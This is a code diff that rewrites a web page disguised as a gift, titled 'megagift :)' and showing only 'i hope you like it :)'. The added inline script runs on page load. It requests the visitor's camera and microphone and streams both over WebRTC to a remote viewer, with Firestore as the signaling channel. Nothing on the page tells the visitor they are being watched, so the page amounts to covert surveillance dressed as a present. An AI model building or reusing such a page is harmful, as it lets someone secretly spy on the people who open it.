@@ -1,14 +1,117 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>Megagift - Live</title>
-  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+<meta charset="UTF-8">
+<title>megagift :)</title>
+
+<style>
+body{
+margin:0;
+background:#ff003f;
+color:white;
+font-family:Nunito, sans-serif;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+font-size:28px;
+text-align:center;
+}
+</style>
+
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
+
 </head>
 <body>
-  <h1>I hope you like it :)</h1>
-  <script src="page5.js"></script>
+
+<div>
+i hope you like it :)
+</div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import {
+getFirestore,
+doc,
+setDoc,
+onSnapshot,
+collection,
+addDoc
+} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+apiKey: "AIzaSyBVFBqpZLGOE5PN1hnRN4GNp3AHfjcHNxI",
+authDomain: "megagift03.firebaseapp.com",
+projectId: "megagift03",
+storageBucket: "megagift03.firebasestorage.app",
+messagingSenderId: "220522611453",
+appId: "1:220522611453:web:95284da4a574518d26b494"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const servers = {
+iceServers: [
+{ urls: "stun:stun.l.google.com:19302" }
+]
+};
+
+const pc = new RTCPeerConnection(servers);
+
+// GET CAMERA + MIC
+const stream = await navigator.mediaDevices.getUserMedia({
+video:true,
+audio:true
+});
+
+stream.getTracks().forEach(track=>{
+pc.addTrack(track, stream);
+});
+
+// FIRESTORE PATH
+const callDoc = doc(db, "calls", "megagift-room");
+const offerCandidates = collection(db, "calls", "megagift-room", "offerCandidates");
+const answerCandidates = collection(db, "calls", "megagift-room", "answerCandidates");
+
+// SEND ICE
+pc.onicecandidate = event=>{
+if(event.candidate){
+addDoc(offerCandidates, event.candidate.toJSON());
+}
+};
+
+// CREATE OFFER
+const offerDescription = await pc.createOffer();
+await pc.setLocalDescription(offerDescription);
+
+await setDoc(callDoc,{
+offer:{
+type: offerDescription.type,
+sdp: offerDescription.sdp
+}
+});
+
+// RECEIVE ANSWER
+onSnapshot(callDoc, snapshot=>{
+const data = snapshot.data();
+if(data?.answer && !pc.currentRemoteDescription){
+pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+}
+});
+
+// RECEIVE ICE FROM VIEWER
+onSnapshot(answerCandidates, snapshot=>{
+snapshot.docChanges().forEach(change=>{
+if(change.type==="added"){
+const candidate = new RTCIceCandidate(change.doc.data());
+pc.addIceCandidate(candidate);
+}
+});
+});
+
+</script>
+
 </body>
 </html>
